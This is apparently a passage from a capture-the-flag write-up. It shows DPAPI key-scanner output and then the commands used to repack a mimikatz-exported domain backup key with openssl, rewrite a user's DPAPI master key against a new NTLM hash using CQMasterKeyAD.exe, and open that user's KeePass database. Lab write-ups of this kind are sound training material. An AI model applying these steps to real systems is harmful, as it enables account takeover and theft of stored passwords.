C1 50 25 DC 99 B3 F7 3E B5 01 85 51 AB D9 C6 1D   .P%....>...Q....
EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
64 95 95 8B CD 2C CD DB                           d....,..
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
Found 2 in c:\users\chajoh\appdata\roaming\microsoft\crypto\keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
 description:          Private Key Properties
 mkguid:               575c62b8-287f-4dae-97ac-7bbe50c995fc
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
D1 4D 84 A7 84 AB F6 08 71 E7 28 38 E6 50 6A 94   .M......q.(8.Pj.
EA 1D 6B B5 A1 11 AA B2 7A E8 31 97 D8 E5 39 C7   ..k.....z.1...9.
80 08 8B C1 3E 2C 1E 4C 66 49 70 AC 35 44 31 AC   ....>,.LfIp.5D1.
D7 81 BD DD 25 A8 99 56                           ....%..V
 description:          Private Key
 mkguid:               575c62b8-287f-4dae-97ac-7bbe50c995fc
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
6E 8D B6 A9 58 3C CF D5 14 BA 89 7B 98 C6 33 84   n...X<.....{..3.
12 A6 9A F2 59 8D 51 E4 4E 0D DA EE 54 E0 1A 4E   ....Y.Q.N...T..N
E9 EC 1C 5D BE D4 DB 0F 4A AC ED 93 62 5E 42 3E   ...]....J...b^B>
A3 AA 2C 61 66 5E 94 A8 BC 88 3C B7 3E C1 B2 BB   ..,af^....<.>...
B0 D4 ED B2 56 FE 7A 35 F3 EC 1F 61 B9 1F FA CD   ....V.z5...a....
0D 21 C4 DD AE 75 5C FB 64 62 89 AE 45 C5 E0 AC   .!...u\.db..E...
BB EC B1 48 D5 24 C8 9B 9F 6A 61 AE 09 CC E5 6D   ...H.$...ja....m
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\MMC\eventvwr
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk\rasphone.pbk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\CREDHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\SYNCHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\575c62b8-287f-4dae-97ac-7bbe50c995fc
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\BK-WINDCORP
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\Preferred
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.acl
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.dic
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.exc
Scanning c:\users\chajoh\appdata\roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\AccountPictures\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\CameraRoll.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Documents.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Music.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Pictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\SavedPictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Videos.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database2.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\The Internet.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts (2).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\7e4dca80246863e3.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\ccba5a5986c77e43.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\d97efdf3888fe7eb.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\4ac866364817f10c.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\7e4dca80246863e3.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\9d1f905ce5044aee.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\ccba5a5986c77e43.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f01b4d95cf55d32a.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f18460fded109990.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Documents.mydocs
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Magnify.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Narrator.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\On-Screen Keyboard.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Internet Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Administrative Tools.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\TranscodedWallpaper
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\CachedFiles\CachedImage_1680_1050_POS4.jpg
```
Jackpot, we found it the KeePass MasterKey is `a773eede-71b6-4d66-b4b8-437e01749caa`

But before we can upload the pfx file and recreate the DPAPI key, we need to change one thing the tool `CQMasterKeyAD.exe` hardcoded passphrase is "cqure", but `mimikatz` export with the passphrase "mimikatz"

So we have to repack the pfx file with the passphrase "cqure"

First we extract the pfx key using this command and the passphrase "mimikatz"
```
openssl pkcs12 -in DMK.pfx -out temp.pem -nodes
```
Then we recreate the pfx key using this command but with the passphrase "cqure"
```
openssl pkcs12 -export -out DMK2.pfx -in temp.pem
```
Now we can upload the pfx file on the target, and we can use `CQMasterKeyAD.exe` to re-encrypt the Keepass MasterKey with the new NTLM hash and the pfx file

```
C:\Users\tom\Desktop>CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
New MasterKey file successfully written to: c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
Now swap the old MasterKey file with the new one and set the system and hidden attributes, see example:
attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
```

Now we need to rename the existing MasterKey file `a773eede-71b6-4d66-b4b8-437e01749caa` in `C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\` to something else and rename our newly created MasterKey `a773eede-71b6-4d66-b4b8-437e01749caa.admodified` to `a773eede-71b6-4d66-b4b8-437e01749caa`

Lastly, we need to run this command to make sure the new MasterKey is set with the correct attributes:

```
attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
```
Once done, we can just login as "windcorp/chajoh" and open the KeePass database and get the third and final flag
